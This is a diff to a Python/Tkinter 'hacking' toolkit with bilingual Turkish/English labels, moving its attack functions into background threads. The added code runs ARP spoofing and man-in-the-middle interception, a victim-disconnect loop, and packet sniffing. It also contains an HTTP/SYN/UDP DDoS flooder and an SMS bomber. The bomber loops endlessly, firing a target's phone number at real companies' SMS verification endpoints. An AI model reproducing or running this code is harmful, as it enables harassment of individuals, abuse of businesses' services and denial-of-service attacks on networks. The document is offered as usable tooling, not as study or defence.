@@ -44,7 +44,7 @@ FS=("DejaVu Sans",8); FL=("DejaVu Sans",14)
 
 class App:
     def __init__(self):
-        self.lang="EN"; self.ps=None; self.kbd_target=None
+        self.lang="EN"; self.ps=None; self.kbd_target=None; self.bg={}
         for deneme in range(30):
             try:
                 self.root=tk.Tk()
@@ -145,6 +145,22 @@ class App:
                 if not isinstance(ev.widget,(tk.Entry,tk.Text)):
                     self.root.after(50,self.kbd_hide)
 
+    def bg_yaz(self,ad,t,metin):
+        if ad in self.bg: self.bg[ad]["buf"].append(metin)
+        if t:
+            try: t.insert(tk.END,metin); t.see(tk.END)
+            except: pass
+    def bg_aktif(self,ad):
+        if ad in self.bg and self.bg[ad].get("t"):
+            if not self.bg[ad]["t"].is_alive(): self.bg[ad]["run"]=False; return False
+            return self.bg[ad]["run"]
+        return False
+    def bg_yenile(self,ad,t):
+        if ad in self.bg:
+            for l in self.bg[ad]["buf"]:
+                try: t.insert(tk.END,l)
+                except: break
+
     def clr(self):
         self.kbd_hide()
         for w in self.cf.winfo_children(): w.destroy()
@@ -173,9 +189,10 @@ class App:
         return e
     def tx(self,r,c,**kw):
         rs=kw.pop("rowspan",1); cs=kw.pop("colspan",3)
+        pdx=kw.pop("padx",1); pdy=kw.pop("pady",1)
         kw.setdefault("bg",BG); kw.setdefault("fg",FG); kw.setdefault("bd",0)
         kw.setdefault("font",FS); kw.setdefault("height",3); kw.setdefault("width",38)
-        f=tk.Frame(self.cf,bg=BG); f.grid(row=r,column=c,sticky="nsew",rowspan=rs,columnspan=cs)
+        f=tk.Frame(self.cf,bg=BG); f.grid(row=r,column=c,sticky="nsew",rowspan=rs,columnspan=cs,padx=pdx,pady=pdy)
         f.grid_columnconfigure(0,weight=1); f.grid_rowconfigure(0,weight=1)
         t=tk.Text(f,**kw); t.grid(row=0,column=0,sticky="nsew")
         sb=tk.Scrollbar(f,orient="vertical",command=t.yview,bg="#555",activebackground="#777",troughcolor="#333")
@@ -529,44 +546,61 @@ sendp(pkt,iface='{ifc}',count=500,inter=0.1,verbose=0)
         ifs=[x.strip() for x in r.stdout.split() if x.strip()]
         if ifs: iv.set(ifs[0])
         self.cb(4,1,ifs,iv,w=12)
-        t=self.tx(5,0,height=2); self.sp_stop=False
+        t=self.tx(5,0,height=2); self.sp_t=t
+        if self.bg_aktif("arps"):
+            self.bg_yenile("arps",t); self.sp_stop=self.bg["arps"]["stop"]
+            self.bg_yaz("arps",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
+            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"sp_stop",True),self.bg_durdur("arps"),self.arps()),6,1,bg="#660000")
+            return
+        self.sp_stop=False
         def basla():
             self.sp_stop=False; t.delete(1.0,tk.END)
-            t.insert(tk.END,self.T("Spoofing... STOP to end","Zehirleme... DURDUR ile bitir\n")); self.f.update()
-            def sp():
-                while not self.sp_stop:
-                    try:
-                        subprocess.run(["sudo","arpspoof","-i",iv.get(),"-t",tg.get(),gw.get()],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-                        subprocess.run(["sudo","arpspoof","-i",iv.get(),"-t",gw.get(),tg.get()],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-                    except: pass
-            threading.Thread(target=sp,daemon=True).start()
-        def dur(): self.sp_stop=True; t.insert(tk.END,self.T("\nStopped","\nDurduruldu"))
-        self.bt(self.T("START","BASLAT"),basla,6,0,bg="#005500")
-        self.bt(self.T("STOP","DURDUR"),dur,6,2,bg="#660000")
+            self.bg_yaz("arps",t,self.T("Spoofing... STOP to end","Zehirleme... DURDUR ile bitir\n")); self.f.update()
+            tgv=tg.get(); gwv=gw.get(); ivv=iv.get()
+            self.bg["arps"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.arps_sp,args=(tgv,gwv,ivv),daemon=True)}
+            self.bg["arps"]["t"].start()
+        sb=self.bt(self.T("START","BASLAT"),None,6,1,bg="#005500")
+        st=self.bt(self.T("STOP","DURDUR"),None,6,1,bg="#660000"); st.grid_remove()
+        sb.config(command=lambda: (sb.grid_remove(),st.grid(),basla()))
+        st.config(command=lambda: (st.grid_remove(),sb.grid(),setattr(self,"sp_stop",True),self.bg_durdur("arps"),self.bg_yaz("arps",t,self.T("\nStopped","\nDurduruldu"))))
+    def arps_sp(self,tgv,gwv,ivv):
+        while not self.sp_stop:
+            try:
+                subprocess.run(["sudo","arpspoof","-i",ivv,"-t",tgv,gwv],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+                subprocess.run(["sudo","arpspoof","-i",ivv,"-t",gwv,tgv],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+            except: pass
 
     def sniff(self):
         self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("Packet Sniff","Paket Yakala"))
-        t=self.tx(2,0,height=5); self.sn_stop=False
+        t=self.tx(2,0,height=5); self.sn_t=t
+        if self.bg_aktif("sniff"):
+            self.bg_yenile("sniff",t); self.sn_stop=self.bg["sniff"]["stop"]
+            self.bg_yaz("sniff",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
+            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"sn_stop",True),self.bg_durdur("sniff"),self.sniff()),6,1,bg="#660000")
+            return
+        sb=self.bt(self.T("START","BASLAT"),None,6,1,bg="#005500")
+        st=self.bt(self.T("STOP","DURDUR"),None,6,1,bg="#660000"); st.grid_remove()
+        self.sn_stop=False; self.bg["sniff"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.sniff_thr,daemon=True)}
         def basla():
+            sb.grid_remove(); st.grid()
             self.sn_stop=False; t.delete(1.0,tk.END)
-            t.insert(tk.END,self.T("Sniffing... STOP to end","Yakaliyor... DURDUR ile bitir\n")); self.f.update()
-            def sn():
-                while not self.sn_stop:
-                    if os.name=="nt":
-                        r=subprocess.run("netstat -n 1",shell=True,capture_output=True,text=True,timeout=2)
-                        for l in r.stdout.split("\n"):
-                            if "ESTABLISHED" in l or "TIME_WAIT" in l:
-                                t.insert(tk.END,l.strip()[:60]+"\n"); self.f.update()
-                    else:
-                        try:
-                            r=subprocess.run(["tcpdump","-c","3","-n","-t","-q"],capture_output=True,text=True,timeout=3)
-                            for l in r.stdout.split("\n"):
-                                if l.strip(): t.insert(tk.END,l.strip()[:60]+"\n"); self.f.update()
-                        except: pass
-            threading.Thread(target=sn,daemon=True).start()
-        def dur(): self.sn_stop=True; t.insert(tk.END,self.T("\nStopped","\nDurduruldu"))
-        self.bt(self.T("START","BASLAT"),basla,6,0,bg="#005500")
-        self.bt(self.T("STOP","DURDUR"),dur,6,2,bg="#660000")
+            self.bg_yaz("sniff",t,self.T("Sniffing... STOP to end","Yakaliyor... DURDUR ile bitir\n")); self.f.update()
+            self.bg["sniff"]["t"].start()
+        st.config(command=lambda: (st.grid_remove(),sb.grid(),setattr(self,"sn_stop",True),self.bg_durdur("sniff"),self.bg_yaz("sniff",t,self.T("\nStopped","\nDurduruldu"))))
+        sb.config(command=basla)
+    def sniff_thr(self):
+        while not self.sn_stop:
+            if os.name=="nt":
+                r=subprocess.run("netstat -n 1",shell=True,capture_output=True,text=True,timeout=2)
+                for l in r.stdout.split("\n"):
+                    if "ESTABLISHED" in l or "TIME_WAIT" in l:
+                        self.bg_yaz("sniff",self.sn_t,l.strip()[:60]+"\n"); self.f.update()
+            else:
+                try:
+                    r=subprocess.run(["tcpdump","-c","3","-n","-t","-q"],capture_output=True,text=True,timeout=3)
+                    for l in r.stdout.split("\n"):
+                        if l.strip(): self.bg_yaz("sniff",self.sn_t,l.strip()[:60]+"\n"); self.f.update()
+                except: pass
 
     def disc(self):
         self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("Disconnect","Baglanti Kes"))
@@ -578,19 +612,28 @@ sendp(pkt,iface='{ifc}',count=500,inter=0.1,verbose=0)
         ifs=[x.strip() for x in r.stdout.split() if x.strip()]
         if ifs: iv.set(ifs[0])
         self.cb(4,1,ifs,iv,w=12)
-        t=self.tx(5,0,height=2); self.dc_stop=False
+        t=self.tx(5,0,height=2); self.dc_t=t
+        if self.bg_aktif("disc"):
+            self.bg_yenile("disc",t); self.dc_stop=self.bg["disc"]["stop"]
+            self.bg_yaz("disc",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
+            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"dc_stop",True),self.bg_durdur("disc"),self.disc()),6,1,bg="#660000")
+            return
+        self.dc_stop=False
         def basla():
             self.dc_stop=False; t.delete(1.0,tk.END)
-            t.insert(tk.END,self.T("Disconnecting...","Baglanti kesiliyor...\n")); self.f.update()
-            def sp():
-                while not self.dc_stop:
-                    try:
-                        subprocess.run(["sudo","arpspoof","-i",iv.get(),"-t",tg.get(),gw.get()],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-                    except: pass
-            threading.Thread(target=sp,daemon=True).start()
-        def dur(): self.dc_stop=True; t.insert(tk.END,self.T("\nStopped","\nDurduruldu"))
-        self.bt(self.T("START","BASLAT"),basla,6,0,bg="#005500")
-        self.bt(self.T("STOP","DURDUR"),dur,6,2,bg="#660000")
+            self.bg_yaz("disc",t,self.T("Disconnecting...","Baglanti kesiliyor...\n")); self.f.update()
+            tgv=tg.get(); gwv=gw.get(); ivv=iv.get()
+            self.bg["disc"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.disc_thr,args=(tgv,gwv,ivv),daemon=True)}
+            self.bg["disc"]["t"].start()
+        sb=self.bt(self.T("START","BASLAT"),None,6,1,bg="#005500")
+        st=self.bt(self.T("STOP","DURDUR"),None,6,1,bg="#660000"); st.grid_remove()
+        sb.config(command=lambda: (sb.grid_remove(),st.grid(),basla()))
+        st.config(command=lambda: (st.grid_remove(),sb.grid(),setattr(self,"dc_stop",True),self.bg_durdur("disc"),self.bg_yaz("disc",t,self.T("\nStopped","\nDurduruldu"))))
+    def disc_thr(self,tgv,gwv,ivv):
+        while not self.dc_stop:
+            try:
+                subprocess.run(["sudo","arpspoof","-i",ivv,"-t",tgv,gwv],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+            except: pass
 
     def block(self):
         self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("Block Internet","Internet Engelle"))
@@ -626,47 +669,53 @@ sendp(pkt,iface='{ifc}',count=500,inter=0.1,verbose=0)
     # ===================== ATTACK =====================
     def m_atk(self):
         self.ps=self.show_main; self.clr(); self.cg(4,3); self.bk(); self.tt(self.T("ATTACK","SALDIRI"))
-        for t,c,r,c2 in [(self.T("DDoS","DDoS"),self.ddos,2,1)]: self.bt(t,c,r,c2)
+        for t,c,r,c2 in [(self.T("DDoS","DDoS"),self.ddos,2,0),(self.T("SMS Bomber","SMS Bomber"),self.sms,2,2)]: self.bt(t,c,r,c2)
 
     def ddos(self):
-        self.dd_stop=False; self.ps=self.m_atk; self.clr(); self.cg(8,3); self.bk(); self.tt("DDoS")
-        self.lb(self.T("Target:","Hedef:"),2,0); h=self.en(2,1); h.insert(0,"127.0.0.1")
-        self.lb("Port:",3,0); p=self.en(3,1); p.insert(0,"80")
-        self.lb(self.T("Threads:","Iplik:"),4,0); th=self.en(4,1); th.insert(0,"50")
-        dv=tk.StringVar(value="http")
-        self.cb(5,0,["http","syn","udp"],dv,w=8)
-        t=self.tx(6,0,height=1)
-        def basla():
-            self.dd_stop=False; t.delete(1.0,tk.END); tp=dv.get()
-            t.insert(tk.END,self.T(f"{tp} flood starting...","{tp} flood basliyor...\n")); tg=h.get(); po=int(p.get()); ip=int(th.get())
-            def sldr():
-                while not self.dd_stop:
-                    try:
-                        if tp=="http":
-                            s=socket.socket(); s.settimeout(2)
-                            s.connect((tg,po)); s.send(f"GET / HTTP/1.1\r\nHost: {tg}\r\n".encode())
-                            time.sleep(10); s.close()
-                        elif tp=="syn":
-                            s=socket.socket(); s.settimeout(1)
-                            try: s.connect((tg,po))
-                            except: pass
-                            s.close()
-                        elif tp=="udp":
-                            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-                            s.sendto(random._urandom(512),(tg,po)); s.close()
-                    except: pass
-            for _ in range(ip): threading.Thread(target=sldr,daemon=True).start()
-            t.insert(tk.END,self.T(f"{ip} threads running. Use STOP.","{ip} iplik. DURDUR ile bitir."))
-        def dur(): self.dd_stop=True; t.insert(tk.END,self.T("\nStopped","\nDurduruldu"))
-        self.bt(self.T("START","BASLAT"),basla,7,0,bg="#005500")
-        self.bt(self.T("STOP","DURDUR"),dur,7,2,bg="#660000")
+        self.ps=self.m_atk; self.clr(); self.cg(8,3); self.bk(); self.tt("DDoS")
+        if self.bg_aktif("ddos"):
+            self.lb(self.T("Target:","Hedef:"),2,0); h=self.en(2,1); h.insert(0,"127.0.0.1")
+            self.lb("Port:",3,0); p=self.en(3,1); p.insert(0,"80")
+            self.lb(self.T("Threads:","Iplik:"),4,0); th=self.en(4,1); th.insert(0,"50")
+            dv=tk.StringVar(value="http"); self.cb(5,0,["http","syn","udp"],dv,w=8)
+            t=self.tx(6,0,height=1); self.dd_t=t; self.bg_yenile("ddos",t)
+            self.bg_yaz("ddos",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
+            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"dd_stop",True),self.bg_durdur("ddos"),self.ddos()),7,1,bg="#660000")
+            return
+        self.dd_stop=False; h=self.en(2,1); h.insert(0,"127.0.0.1")
+        p=self.en(3,1); p.insert(0,"80"); th=self.en(4,1); th.insert(0,"50")
+        dv=tk.StringVar(value="http"); self.cb(5,0,["http","syn","udp"],dv,w=8)
+        t=self.tx(6,0,height=1); self.dd_t=t
+        sb=self.bt(self.T("START","BASLAT"),None,7,1,bg="#005500")
+        st=self.bt(self.T("STOP","DURDUR"),None,7,1,bg="#660000"); st.grid_remove()
+        sb.config(command=lambda: (sb.grid_remove(),st.grid(),self.ddos_basla(h.get(),p.get(),th.get(),dv.get())))
+        st.config(command=lambda: (st.grid_remove(),sb.grid(),setattr(self,"dd_stop",True),self.bg_durdur("ddos"),self.dd_t.insert(tk.END,self.T("\nStopped","\nDurduruldu"))))
+    def ddos_basla(self,tg,po,ip,tp):
+        self.dd_stop=False; self.bg["ddos"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.ddos_sldr,args=(tg,int(po),int(ip),tp),daemon=True)}
+        self.bg["ddos"]["t"].start()
+        self.bg_yaz("ddos",self.dd_t,self.T(f"{tp} flood starting...","{tp} flood basliyor...\n"))
+    def ddos_sldr(self,tg,po,ip,tp):
+        while not self.dd_stop:
+            try:
+                if tp=="http":
+                    s=socket.socket(); s.settimeout(2); s.connect((tg,po))
+                    s.send(f"GET / HTTP/1.1\r\nHost: {tg}\r\n".encode()); time.sleep(10); s.close()
+                elif tp=="syn":
+                    s=socket.socket(); s.settimeout(1)
+                    try: s.connect((tg,po))
+                    except: pass; s.close()
+                elif tp=="udp":
+                    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+                    s.sendto(random._urandom(512),(tg,po)); s.close()
+            except: pass
+    def bg_durdur(self,ad):
+        if ad in self.bg: self.bg[ad]["stop"]=True; self.bg[ad]["run"]=False
 
     # ===================== OSINT =====================
     def m_osint(self):
         self.ps=self.show_main; self.clr(); self.cg(4,3); self.bk(); self.tt(self.T("OSINT","OSINT"))
         for t,c,r,c2 in [(self.T("Web Search","Web Ara"),self.web,2,0),(self.T("User Search","Kullanici Ara"),self.user,2,1),
-            (self.T("Phone OSINT","Telefon OSINT"),self.phone,2,2),(self.T("Dorking","Dorking"),self.dork,3,0),
-            (self.T("SMS Bomber","SMS Bomber"),self.sms,3,1)]: self.bt(t,c,r,c2)
+            (self.T("Phone OSINT","Telefon OSINT"),self.phone,2,2),(self.T("Dorking","Dorking"),self.dork,3,0)]: self.bt(t,c,r,c2)
 
     def web(self):
         self.ps=self.m_osint; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Web Search","Web Ara"))
@@ -745,13 +794,32 @@ sendp(pkt,iface='{ifc}',count=500,inter=0.1,verbose=0)
         self.be(e,q); self.ac(self.T("SEARCH","ARA"),q,6)
 
     def sms(self):
-        self.ps=self.m_osint; self.clr(); self.cg(9,3); self.bk(); self.tt("SMS Bomber")
-        self.lb(self.T("Phone:","Telefon:"),2,0); e=self.en(2,1); self.np(e,4)
-        sv=tk.StringVar(value="tr")
-        self.cb(3,0,["tr","intl"],sv,w=6)
-        def q():
-            no=e.get()
-            if len(no)<10: messagebox.showerror(self.T("Error","Hata"),self.T("Invalid num","Gecersiz")); return
+        self.ps=self.m_atk; self.clr(); self.cg(9,3); self.bk(); self.tt("SMS Bomber")
+        self.lb(self.T("Phone:","Telefon:"),2,0); e=self.en(2,1,w=20,colspan=2)
+        sv=tk.StringVar(value="tr"); self.cb(3,0,["tr","intl"],sv,w=6)
+        nf=tk.Frame(self.cf,bg=BG); nf.grid(row=5,column=0,rowspan=4,sticky="nsew",padx=(2,6))
+        for i in range(3): nf.grid_columnconfigure(i,weight=1)
+        for i in range(4): nf.grid_rowconfigure(i,weight=1)
+        for ri,ks in enumerate([["1","2","3"],["4","5","6"],["7","8","9"],[".","0","BS"]]):
+            for ci,k in enumerate(ks):
+                def ek(kv=k,e=e):
+                    if kv=="BS": t=e.get()[:-1]; e.delete(0,tk.END); e.insert(0,t)
+                    else: e.insert(tk.END,kv)
+                tk.Button(nf,text=k,command=ek,bg="#444",fg=FG,font=FL,
+                          relief="raised",bd=2,activebackground="#666"
+                          ).grid(row=ri,column=ci,padx=1,pady=1,sticky="nsew")
+        t=self.tx(5,1,height=8,colspan=2,rowspan=4,padx=(6,2)); self.sm_stop=False; self.sm_t=t
+        if self.bg_aktif("sms"):
+            self.bg_yenile("sms",t); self.sm_stop=self.bg["sms"]["stop"]
+            self.bg_yaz("sms",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
+            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"sm_stop",True),self.bg_durdur("sms"),self.sms()),4,1,bg="#660000")
+            return
+        sb=self.bt(self.T("START","BASLAT"),None,4,1,bg="#005500")
+        st=self.bt(self.T("STOP","DURDUR"),None,4,1,bg="#660000"); st.grid_remove()
+        def basla():
+            sb.grid_remove(); st.grid(); self.f.update()
+            self.sm_stop=False; t.delete(1.0,tk.END); no=e.get()
+            if len(no)<10: sb.grid(); st.grid_remove(); messagebox.showerror(self.T("Error","Hata"),self.T("Invalid num","Gecersiz")); return
             apis=[]
             if sv.get()=="tr":
                 apis=[("KahveDunyasi","https://www.kahvedunyasi.com/ajax/Account/LoginSendPhoneCode?phone={}"),
@@ -774,19 +842,28 @@ sendp(pkt,iface='{ifc}',count=500,inter=0.1,verbose=0)
                     ("Coffy","https://www.coffy.com.tr/api/Account/SendSms?phone={}")]
             else:
                 apis=[("Textbelt","https://textbelt.com/text"),("Callmebot","https://api.callmebot.com/sms/send")]
-            n=0; top=len(apis)
-            for i,(ad,url) in enumerate(apis):
+            self.bg["sms"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.sms_thr,args=(no,apis,sv.get()),daemon=True)}
+            self.bg["sms"]["t"].start()
+        def dur(): st.grid_remove(); sb.grid(); setattr(self,"sm_stop",True); self.bg_durdur("sms"); self.bg_yaz("sms",t,self.T("\nStopped","\nDurduruldu"))
+        st.config(command=dur); sb.config(command=basla)
+    def sms_thr(self,no,apis,ulke):
+        tur=0
+        while not self.sm_stop:
+            tur+=1; self.bg_yaz("sms",self.sm_t,f"\n--- Round {tur} ---\n")
+            for ad,url in apis:
+                if self.sm_stop: break
                 try:
-                    if sv.get()=="intl":
+                    if ulke=="intl":
                         req=urllib.request.Request(url,data=urllib.parse.urlencode({"phone":no,"message":"test"}).encode(),
                                                     headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
                     else:
                         req=urllib.request.Request(url.format(no),headers={"User-Agent":"Mozilla/5.0"})
-                    urllib.request.urlopen(req,timeout=5); n+=1
-                except: pass
-                time.sleep(0.3)
-            messagebox.showinfo(self.T("Result","Sonuc"),f"{n}/{top} SMS {self.T('sent','gonderildi')}")
-        self.ac(self.T("SEND","GONDER"),q,8)
+                    urllib.request.urlopen(req,timeout=5)
+                    self.bg_yaz("sms",self.sm_t,f"+ {ad}\n")
+                except: self.bg_yaz("sms",self.sm_t,f"- {ad}\n"); self.f.update()
+                if self.sm_stop: break
+                time.sleep(0.2)
+        self.bg_yaz("sms",self.sm_t,self.T("Stopped","Durdu"))
 
     # ===================== TOOLS =====================
     def m_tools(self):
